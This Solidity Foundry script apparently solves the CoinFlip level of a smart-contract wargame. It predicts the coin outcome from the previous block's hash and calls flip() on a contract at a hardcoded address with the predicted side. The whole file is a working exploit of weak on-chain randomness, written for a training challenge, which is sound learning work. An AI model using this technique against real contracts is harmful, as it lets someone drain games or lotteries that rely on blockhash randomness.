// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract CoinFlipSolution is Test {
    CoinFlip level4 = CoinFlip(0x943993cd8d6a80F7808B79DD053346C1f061221f);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function testCoinFlip() external {
        vm.startBroadcast();
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level4.flip(true);
        } else {
            level4.flip(false);
        }
        console.log();
        console.log("BlockHash:", blockValue);
        vm.stopBroadcast();
    }
}
